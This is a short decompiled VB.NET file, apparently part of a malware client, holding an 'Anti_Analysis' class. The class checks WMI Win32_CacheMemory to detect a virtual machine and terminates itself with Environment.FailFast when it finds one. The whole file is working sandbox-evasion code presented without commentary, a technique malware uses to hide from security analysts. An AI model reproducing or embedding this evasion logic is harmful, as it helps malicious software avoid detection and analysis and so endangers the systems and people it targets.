Imports System
Imports System.Management
Imports System.Threading

Namespace Client.Helper
	' Token: 0x0200000C RID: 12
	Friend Class Anti_Analysis
		' Token: 0x06000045 RID: 69 RVA: 0x00002245 File Offset: 0x00000445
		Public Shared Sub RunAntiAnalysis()
			If Anti_Analysis.isVM_by_wim_temper() Then
				Environment.FailFast(Nothing)
			End If
			Thread.Sleep(1000)
		End Sub

		' Token: 0x06000046 RID: 70 RVA: 0x00003B80 File Offset: 0x00001D80
		Public Shared Function isVM_by_wim_temper() As Boolean
			Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher(New SelectQuery("Select * from Win32_CacheMemory"))
			Dim num As Integer = 0
			For Each managementBaseObject As ManagementBaseObject In managementObjectSearcher.[Get]()
				Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
				num += 1
			Next
			Return num = 0
		End Function
	End Class
End Namespace
